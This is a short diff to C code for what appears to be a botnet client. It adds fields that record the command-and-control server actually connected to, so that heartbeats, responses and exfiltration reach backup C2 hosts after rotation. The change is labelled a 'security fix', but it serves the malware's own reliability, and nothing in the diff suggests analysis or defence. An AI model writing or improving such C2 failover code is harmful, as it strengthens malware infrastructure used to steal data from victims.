@@ -74,6 +74,15 @@ typedef struct {
     uint16_t port;
     char path[128];
     char user_agent[128];
+    /* SECURITY FIX (#93): the endpoint actually connected to. When the
+     * rotation chain (#93) is on a backup, http_connect dials the backup
+     * host but http_post/http_get previously built the Host header from
+     * bot->c2_http.server — the PRIMARY — so rotated requests carried the
+     * wrong Host and the backup misrouted every heartbeat/response/exfil
+     * (#110). Set at connect time from c2_rotation_endpoint(); request
+     * builders read THIS, not c2_http.server. */
+    char effective_server[256];
+    uint16_t effective_port;
     /* SECURITY FIX (#10): DNS pinning */
     int dns_pinned;
     struct in_addr pinned_addr;
